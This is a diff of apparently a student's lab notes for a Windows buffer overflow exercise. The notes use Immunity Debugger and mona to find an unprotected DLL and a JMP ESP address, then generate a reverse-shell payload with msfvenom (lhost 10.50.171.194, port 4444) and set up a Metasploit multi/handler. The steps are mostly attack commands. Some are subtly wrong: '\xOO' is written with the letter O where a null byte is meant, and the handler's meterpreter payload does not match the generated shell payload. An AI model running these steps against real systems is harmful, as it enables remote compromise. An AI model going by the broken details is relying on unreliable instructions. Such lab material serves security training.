@@ -547,7 +547,7 @@
     d. If PAUSE in bottom right, click play button to play in top left; should change to 'Running'
     
   -4. Create Script on linux machine 
-      -a. 
+      -a. View peep.py in /home/student/pee
 
   -5. Send/Run script while program is running AND immunity is running in bottom right on windows machine. EVERY TIME RUN SCRIPT -> RESTART/REWIND IMMUNITY AND EXE
 
@@ -560,9 +560,25 @@
   -9. Add the buf += "BBBB" under the buf += "A", Look in immunity to see EIP = 4242 to verify worked
 
   -10. Utulize Mone modules to search for unprotected DLLs
-    a. run  in bottom white of Immunity: !mona modules
+    a. run  in bottom white of Immunity: !mona modules  
+    b. Look for dll with Falses across the board, meaning dll is uprotected
+    c. run in bottom: !mona jmp -r esp -m "<dll>"
+    d. Window > Log Data > View results
+    e. On first line: Right click > copy to clipboard > address | convert it into little endian format
+      i. example : 0x625011af -> "\xAF\x11\x50\x62"
+    f. Replace 4 B's buf statement in script with new little endian value
+    g. From LinOPS, generate shell code using msfvenom
+      i. msfvenom -p windows/shell/reverse_tcp lhost=10.50.171.194 lport=4444 -b "\xOO" -f python
+    h. Paste output under all bufs already placed.
+    i. Add nop line: "\x90" * 15
 
-
+  -11. Create msfconsole multi/handler from linops
+    a.msfconsole
+    b.use multi/handler
+    c.set payload windows/meterpreter/reverse_tcp
+    d.set LHOST 0.0.0.0
+    e.set LPORT 4444
+    f.exploit
 
 
 
